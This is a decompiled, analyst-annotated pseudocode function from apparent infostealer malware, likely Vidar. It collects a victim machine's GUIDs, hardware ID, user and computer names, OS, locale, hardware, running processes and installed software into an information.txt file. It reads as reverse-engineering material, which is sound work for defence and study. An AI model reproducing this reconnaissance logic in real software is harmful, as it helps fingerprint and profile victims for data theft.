void *__stdcall vdr_collect_victim_system_infos()
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]

  a1 = g_vdr_file_struc;
  memset(str_victim_collected_infos, 0, sizeof(str_victim_collected_infos));
  lstrcatA(str_victim_collected_infos, str_Version);
  str_56_1 = vdr_build_str_56_1(&sdtStr);
  v25 = 0;
  if ( str_56_1->dwDynamicNumBytes >= 0x10u )
  {
    str_56_1 = str_56_1->pszString;
  }
  lstrcatA(str_victim_collected_infos, str_56_1);
  v25 = 0xFFFFFFFF;
  std::string::_Tidy(&sdtStr, 1, 0);
  lstrcatA(str_victim_collected_infos, "\n\n");
  lstrcatA(str_victim_collected_infos, str_Date);
  str_victim_date_time = vdr_grab_victim_date_time();
  lstrcatA(str_victim_collected_infos, str_victim_date_time);
  lstrcatA(str_victim_collected_infos, L"\n");
  lstrcatA(str_victim_collected_infos, str_MachineID);
  szMachineGuid = vdr_retrieve_MachineGuid(&sdtStr);
  v25 = 1;
  if ( szMachineGuid->dwDynamicNumBytes >= 0x10u )
  {
    szMachineGuid = szMachineGuid->pszString;
  }
  lstrcatA(str_victim_collected_infos, szMachineGuid);
  v25 = 0xFFFFFFFF;
  std::string::_Tidy(&sdtStr, 1, 0);
  lstrcatA(str_victim_collected_infos, L"\n");
  lstrcatA(str_victim_collected_infos, str_GUID);
  szHwProfileGuid = vdr_retrieve_hw_profile_guid(&sdtStr);
  v25 = 2;
  if ( szHwProfileGuid->dwDynamicNumBytes >= 0x10u )
  {
    szHwProfileGuid = szHwProfileGuid->pszString;
  }
  lstrcatA(str_victim_collected_infos, szHwProfileGuid);
  v25 = 0xFFFFFFFF;
  std::string::_Tidy(&sdtStr, 1, 0);
  lstrcatA(str_victim_collected_infos, L"\n");
  lstrcatA(str_victim_collected_infos, str_HWID);
  str_VolSerNumFinal_PartOfMachineGuidValue_PartOfHwProfileGuid = vdr_retrieve_VolSerNum_MachineGuid_HwProfileGuid(&sdtStr);
  v25 = 3;
  if ( str_VolSerNumFinal_PartOfMachineGuidValue_PartOfHwProfileGuid->dwDynamicNumBytes >= 0x10u )
  {
    str_VolSerNumFinal_PartOfMachineGuidValue_PartOfHwProfileGuid = str_VolSerNumFinal_PartOfMachineGuidValue_PartOfHwProfileGuid->pszString;
  }
  lstrcatA(str_victim_collected_infos, str_VolSerNumFinal_PartOfMachineGuidValue_PartOfHwProfileGuid);
  v25 = 0xFFFFFFFF;
  std::string::_Tidy(&sdtStr, 1, 0);
  lstrcatA(str_victim_collected_infos, "\n\n");
  lstrcatA(str_victim_collected_infos, str_Path);
  dwCurrProcId = GetCurrentProcessId_1();
  str_process_full_path = vdr_retrieve_full_path_of_process(&sdtStr, dwCurrProcId);
  v25 = 4;
  if ( str_process_full_path->dwDynamicNumBytes >= 0x10u )
  {
    str_process_full_path = str_process_full_path->pszString;
  }
  lstrcatA(str_victim_collected_infos, str_process_full_path);
  v25 = 0xFFFFFFFF;
  std::string::_Tidy(&sdtStr, 1, 0);
  lstrcatA(str_victim_collected_infos, L"\n");
  lstrcatA(str_victim_collected_infos, str_Work_Dir_In_memory);
  lstrcatA(str_victim_collected_infos, "\n\n");
  lstrcatA(str_victim_collected_infos, str_Windows);
  str_windows_name = vdr_retrieve_windows_name_from_registry();
  lstrcatA(str_victim_collected_infos, str_windows_name);
  lstrcatA(str_victim_collected_infos, " [");
  v8 = vdr_check_is_64bit_os();
  lstrcatA(str_victim_collected_infos, v8);
  lstrcatA(str_victim_collected_infos, "]\n");
  lstrcatA(str_victim_collected_infos, str_Computer_Name);
  str_computer_name = vdr_get_computer_name();
  lstrcatA(str_victim_collected_infos, str_computer_name);
  lstrcatA(str_victim_collected_infos, L"\n");
  lstrcatA(str_victim_collected_infos, str_User_Name);
  str_user_logon_name = vdr_get_user_logon_name();
  lstrcatA(str_victim_collected_infos, str_user_logon_name);
  lstrcatA(str_victim_collected_infos, L"\n");
  lstrcatA(str_victim_collected_infos, str_Display_Resolution);
  str_display_resolution = vdr_retrieve_display_resolution(&sdtStr);
  v25 = 5;
  if ( str_display_resolution->dwDynamicNumBytes >= 0x10u )
  {
    str_display_resolution = str_display_resolution->pszString;
  }
  lstrcatA(str_victim_collected_infos, str_display_resolution);
  v25 = 0xFFFFFFFF;
  std::string::_Tidy(&sdtStr, 1, 0);
  lstrcatA(str_victim_collected_infos, L"\n");
  lstrcatA(str_victim_collected_infos, str_Display_Language);
  str_display_language = vdr_retrieve_display_language(&sdtStr);
  v25 = 6;
  if ( str_display_language->dwDynamicNumBytes >= 0x10u )
  {
    str_display_language = str_display_language->pszString;
  }
  lstrcatA(str_victim_collected_infos, str_display_language);
  v25 = 0xFFFFFFFF;
  std::string::_Tidy(&sdtStr, 1, 0);
  lstrcatA(str_victim_collected_infos, L"\n");
  lstrcatA(str_victim_collected_infos, str_Keyboard_Languages);
  str_keyboard_languages = vdr_retrieve_keyboard_languages();
  lstrcatA(str_victim_collected_infos, str_keyboard_languages);
  lstrcatA(str_victim_collected_infos, L"\n");
  lstrcatA(str_victim_collected_infos, str_Local_Time);
  str_local_time = vdr_grab_victim_date_time();
  lstrcatA(str_victim_collected_infos, str_local_time);
  lstrcatA(str_victim_collected_infos, L"\n");
  lstrcatA(str_victim_collected_infos, str_TimeZone);
  str_time_zone = vdr_retrieve_time_zone(&sdtStr);
  v25 = 7;
  if ( str_time_zone->dwDynamicNumBytes >= 0x10u )
  {
    str_time_zone = str_time_zone->pszString;
  }
  lstrcatA(str_victim_collected_infos, str_time_zone);
  v25 = 0xFFFFFFFF;
  std::string::_Tidy(&sdtStr, 1, 0);
  lstrcatA(str_victim_collected_infos, "\n\n");
  lstrcatA(str_victim_collected_infos, str__Hardware_);
  lstrcatA(str_victim_collected_infos, L"\n");
  lstrcatA(str_victim_collected_infos, str_Processor);
  str_processor_name = vdr_retrieve_processor_name_from_registry();
  lstrcatA(str_victim_collected_infos, str_processor_name);
  lstrcatA(str_victim_collected_infos, L"\n");
  lstrcatA(str_victim_collected_infos, str_CPU_Count);
  str_num_of_processors = vdr_reitreve_num_of_processors_info(&sdtStr);
  v25 = 8;
  if ( str_num_of_processors->dwDynamicNumBytes >= 0x10u )
  {
    str_num_of_processors = str_num_of_processors->pszString;
  }
  lstrcatA(str_victim_collected_infos, str_num_of_processors);
  v25 = 0xFFFFFFFF;
  std::string::_Tidy(&sdtStr, 1, 0);
  lstrcatA(str_victim_collected_infos, L"\n");
  lstrcatA(str_victim_collected_infos, str_RAM);
  str_ram_info = vdr_retrieve_ram_info();
  lstrcatA(str_victim_collected_infos, str_ram_info);
  lstrcatA(str_victim_collected_infos, L"\n");
  lstrcatA(str_victim_collected_infos, str_VideoCard);
  DisplayDevice.cb = 0x1A8;
  EnumDisplayDevicesA(0, 0, &DisplayDevice, 1u);
  lstrcatA(str_victim_collected_infos, DisplayDevice.DeviceString);
  lstrcatA(str_victim_collected_infos, L"\n");
  lstrcatA(str_victim_collected_infos, str__Processes_);
  lstrcatA(str_victim_collected_infos, L"\n");
  sub_417930(str_victim_collected_infos);
  lstrcatA(str_victim_collected_infos, L"\n");
  lstrcatA(str_victim_collected_infos, str__Software_);
  lstrcatA(str_victim_collected_infos, L"\n");
  vdr_retrieve_installed_softwares_info(str_victim_collected_infos);
  v19 = lstrlenA(str_victim_collected_infos);
  // save all collected information to information.txt
  vdr_create_file(a1, str_victim_collected_infos, str_information_txt_path, v19, 3);
  return memset(str_victim_collected_infos, 0, sizeof(str_victim_collected_infos));
}
